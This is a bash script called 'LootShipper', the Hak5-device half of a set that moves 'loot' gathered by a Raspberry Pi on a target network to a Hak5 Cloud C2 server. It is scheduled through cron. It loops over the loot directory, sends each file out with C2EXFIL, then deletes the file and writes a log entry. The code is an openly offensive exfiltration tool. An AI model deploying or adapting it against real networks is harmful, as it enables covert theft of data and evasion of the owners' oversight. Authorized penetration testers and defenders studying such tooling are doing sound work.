#!/bin/bash
#
#
#                                       lOOT sHIPPER
#
#
# -----*********** >>>>>>>>>>>>>>      Hak5 device part      <<<<<<<<<<<<<< ***********-----
#
#
# "Wade Wilson for president!"
#
#
# And..... after the political announcement has been made, lets present the script.....
#
# The LootShipper bash script-set is used to get Raspberry Pi loot to Cloud C2 even
# though there is no client support for the Raspberry Pi (yet).
# But, Hak5 gear can be used as a broker to get loot to Cloud C2. This script (and
# the accompanying script on the chosen Hak5 device) needs to be adjusted according
# to the specific needs for the current scenario at hand.
#
# This script-set is based on the scenario that the Raspberry Pi collects loot and
# produces a text based loot file. This loot file is transfered to the chosen
# Hak5 device (in this case a Packer Squirrel im arming mode which is physically
# attached to the ethernet port of the Raspberry Pi) using scp. The scripts are
# not bullet proof and are for sure in need of certain improval. But, it has been
# created with the following in mind; "Don't let perfect get in the way of good enough".
#
# ---
#
# This script assumes that a Raspberry Pi has been set up and is generating loot
# that is scp'd to the Hak5 device. The Hak5 device shall also be added to a
# Cloud C2 instance with Loot Streaming enabled.
#
# This script is the Hak5 device part of the solution. It is intended to run as a
# cron job every hour @ minute 45 of the hour
# 45 * * * * /root/lootshipper_hak5.sh >/dev/null 2>&1
#
# This script is expected to be located in /root
#
# A loot directory is expected to exist in /root, i.e. /root/loot
#
# The loot file is always expected to be named "lootfile.ascii<+date/time stamp>"
# and placed in the above mentioned loot directory
#
#
# ---------------------------------------------------------------------------------------
#
# Copyleft properties and all the money in the world belong to Chriz Ree (July 2020).
#
# ---------------------------------------------------------------------------------------


# Get the current date and time to be used in log entries
DATENOW=$(date '+%Y-%m-%d %H:%M:%S')

# Set loot directory location
# Note: no subdirectories in this directory, just loot files!
LOOTDIR="/root/loot/"

# Set log file name
LOGFILE="$HOME/loot.log"

# Check if there is any loot in the Hak5 device loot directory, if not then exit the script
# after adding a comment to the log file
if [ -z "$(ls -A $LOOTDIR)" ]; then
    echo "$DATENOW - Loot file(s) does not exist at the moment, exiting....." >> $LOGFILE
    exit 1
fi

# Copy the loot to Cloud C2 using C2EXFIL, use a loop if there for some reason are more
# than one loot file in the loot directory
# https://docs.hak5.org/hc/en-us/articles/360034024313-C2EXFIL

for file_entry in "$LOOTDIR"*
do
    if [ -f "$file_entry" ];then
        # Exfiltrate the loot to Cloud C2
		/usr/sbin/C2EXFIL STRING $file_entry RPiPayload
		# Delete loot file regardless if C2EXFIL was successful or not
        rm $file_entry
        # Add message to log file
        echo "$DATENOW - Loot file $file_entry exfiltrated using C2EXFIL" >> $LOGFILE
    fi
done
